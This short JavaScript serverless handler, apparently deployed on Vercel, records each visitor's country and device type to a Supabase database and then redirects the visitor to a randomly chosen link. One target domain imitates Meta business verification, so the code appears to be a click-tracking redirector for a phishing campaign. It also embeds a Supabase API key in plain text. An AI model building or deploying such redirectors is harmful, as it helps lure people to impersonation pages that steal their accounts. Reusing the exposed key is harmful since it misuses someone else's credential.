export default async function handler(req, res) {
  const targetLinks = [
    "https://meta-businessverified-for-theta.vercel.app/",
    "https://your-second-link.vercel.app",
    "https://your-third-link.vercel.app"
  ];

  const randomLink = targetLinks[Math.floor(Math.random() * targetLinks.length)];

  // Nhận diện thiết bị và quốc gia
  const ua = req.headers['user-agent'] || '';
  let device = "Desktop";
  if (/mobile/i.test(ua)) device = "Mobile";
  else if (/tablet|ipad/i.test(ua)) device = "Tablet";

  const country = req.headers['x-vercel-ip-country'] || 'Unknown';

  try {
    await fetch("https://xaeyujupphagmklxtnsf.supabase.co/rest/v1/clicks", {
      method: "POST",
      headers: {
        "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhhZXl1anVwcGhhZ21rbHh0bnNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI0NTI1MjMsImV4cCI6MjA4ODAyODUyM30.LwXh6RJx2x0i_rAfUnzO-ZTn2VLoVPKunku5A24SYHE",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhhZXl1anVwcGhhZ21rbHh0bnNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI0NTI1MjMsImV4cCI6MjA4ODAyODUyM30.LwXh6RJx2x0i_rAfUnzO-ZTn2VLoVPKunku5A24SYHE",
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
      },
      body: JSON.stringify({
        country: country,
        device: device,
        created_at: new Date().toISOString()
      })
    });
  } catch (err) {
    console.error(err);
  }

  res.redirect(302, randomLink);
}
